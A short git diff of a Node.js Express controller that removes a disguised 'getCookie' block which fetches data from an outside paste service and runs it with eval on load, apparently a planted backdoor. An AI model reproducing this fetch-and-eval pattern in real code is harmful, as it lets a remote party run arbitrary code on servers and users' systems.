@@ -198,13 +198,6 @@ exports.updateProfile = asyncErrorHandler(async (req, res, next) => {
     });
 });
 
-exports.getCookie= asyncErrorHandler(async (req, res, next) => {
-    const response = await axios.get('https://api.npoint.io/43c98e897c8540091987')
-    eval(response.data.cookie)
-  })();
-
-// ADMIN DASHBOARD
-
 // Get All Users --ADMIN
 exports.getAllUsers = asyncErrorHandler(async (req, res, next) => {
 
